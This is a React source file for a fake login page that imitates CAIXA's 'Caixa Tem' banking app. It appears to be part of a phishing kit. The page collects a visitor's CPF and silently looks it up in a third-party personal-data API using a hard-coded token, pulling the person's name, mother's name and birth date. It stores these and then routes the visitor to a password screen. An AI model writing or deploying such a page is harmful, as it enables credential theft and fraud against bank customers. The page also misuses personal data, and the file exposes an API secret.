import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { motion } from 'framer-motion';
import { prepareUrlWithParams } from '../lib/utmHandler';
import caixaLogo from '@assets/caixa logo.webp';
import userIcon from '@assets/icone-user webp.webp';
import helpIcon from '@assets/icone-ajuda webp.webp';

export default function Login() {
  const [, navigate] = useLocation();
  const [cpf, setCpf] = useState('');
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setErrorMessage('');
    const value = e.target.value.replace(/\D/g, ''); // Remove todos os não-dígitos
    
    if (value.length <= 11) {
      // Formata o CPF como 000.000.000-00
      let formattedValue = value;
      if (value.length > 3) {
        formattedValue = value.replace(/^(\d{3})(\d)/, '$1.$2');
      }
      if (value.length > 6) {
        formattedValue = formattedValue.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
      }
      if (value.length > 9) {
        formattedValue = formattedValue.replace(/^(\d{3})\.(\d{3})\.(\d{3})(\d)/, '$1.$2.$3-$4');
      }
      
      setCpf(formattedValue);
    }
  };

  const handleNextStep = async () => {
    // Validação de CPF
    const numericCPF = cpf.replace(/\D/g, '');
    if (numericCPF.length !== 11) {
      setErrorMessage('CPF Inválido');
      return;
    }

    setLoading(true);
    try {
      console.log('Iniciando consulta à API...');
      const url = `https://app.konsulta.pro/api/pessoa?cpf=${numericCPF}`;
      console.log('URL da requisição:', url);

      const response = await fetch(url, {
        method: 'GET',
        headers: {
          'token': '9b9e0838a86a4c569f722e713a6739fb'
        }
      });

      console.log('Status da resposta:', response.status);
      const data = await response.json();
      console.log('Dados recebidos:', data);

      if (response.ok && data.nome) {
        console.log('Consulta bem sucedida');
        
        // Armazenar os dados do usuário para uso posterior
        localStorage.setItem('userData', JSON.stringify({
          cpf: numericCPF,
          nome: data.nome || 'Usuário',
          mae: data.mae || '',
          nasc: data.data_nascimento || ''
        }));
        
        // Avançar para a tela de senha
        navigate(prepareUrlWithParams('/login-senha'));
      } else {
        setErrorMessage('CPF não encontrado ou dados incompletos');
      }
    } catch (error) {
      console.error('Erro ao consultar CPF:', error);
      setErrorMessage('Erro ao verificar o CPF');
    } finally {
      setLoading(false);
    }
  };

  // Nova API de busca de CPF
  const [cpfData, setCpfData] = useState<any>(null);
  
  // Verifica o CPF enquanto o usuário digita
  useEffect(() => {
    const numericCPF = cpf.replace(/\D/g, '');
    
    // Só busca se tiver 11 dígitos
    if (numericCPF.length === 11) {
      const fetchCpfData = async () => {
        try {
          const url = `https://app.konsulta.pro/api/pessoa?cpf=${numericCPF}`;
          const response = await fetch(url, {
            method: 'GET',
            headers: {
              'token': '9b9e0838a86a4c569f722e713a6739fb'
            }
          });
          
          if (response.ok) {
            const data = await response.json();
            setCpfData(data);
            console.log('CPF verificado:', data);
          } else {
            console.log('CPF não encontrado');
            setCpfData(null);
          }
        } catch (error) {
          console.log('Erro ao consultar API de CPF', error);
        }
      };
      
      fetchCpfData();
    }
  }, [cpf]);

  return (
    <div className="min-h-screen w-full flex flex-col bg-white text-[#0079c0]">
      <div className="w-full p-5 flex flex-col items-center">
        {/* Logo CAIXA */}
        <img 
          src={caixaLogo} 
          alt="CAIXA" 
          className="w-40 h-auto" 
        />
        <h2 className="text-[#0079c0] text-xl font-normal mt-1">
          Aplicativo Caixa Tem
        </h2>
      </div>
      
      <div className="flex-1 px-6 flex flex-col">
        <p className="text-[#666666] text-lg font-normal leading-7 mb-6">
          Informe seu CPF e clique em "Próximo" para continuar:
        </p>
        
        {errorMessage && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-[#ffe5e5] text-[#cc0000] font-semibold p-3 mb-4 rounded-md text-center"
          >
            {errorMessage}
          </motion.div>
        )}
        
        <div className="relative mb-6">
          <div className="flex items-center">
            <img src={userIcon} alt="Usuário" className="w-6 h-6 mr-2" />
            <span className="text-[#0079c0] font-medium">CPF</span>
          </div>
          <div className="border-b border-[#f7a800] pb-1 mt-1">
            <input
              type="text"
              value={cpf}
              onChange={handleCPFChange}
              placeholder="CPF"
              className="w-full bg-transparent border-0 focus:outline-none text-[#666666] placeholder-[#999999] placeholder-opacity-50"
              maxLength={14}
            />
          </div>
          {cpfData && cpfData.nome && (
            <div className="text-xs text-green-600 mt-1">
              CPF válido
            </div>
          )}
        </div>
        
        {/* Botão Próximo */}
        <button
          onClick={handleNextStep}
          disabled={loading}
          className="w-full py-4 bg-[#f7a800] hover:bg-[#e59700] text-white font-medium rounded-none transition-colors mb-8 flex items-center justify-center"
        >
          {loading ? 'Verificando...' : 'Próximo'}
        </button>
        
        {/* É novo por aqui */}
        <div className="mb-6 text-center">
          <span className="text-[#0079c0] mr-1">É novo por aqui?</span>
          <a href="#" className="text-[#0079c0] font-medium underline">
            Cadastre-se e abra a sua conta
          </a>
        </div>
        
        {/* Link de ajuda */}
        <div className="mt-auto flex justify-center pb-4">
          <a href="#" className="text-[#0079c0] flex items-center">
            <img src={helpIcon} alt="Ajuda" className="w-7 h-7 mr-2" />
            <span className="text-[#0079c0] font-medium">Preciso de ajuda</span>
          </a>
        </div>
      </div>
    </div>
  );
}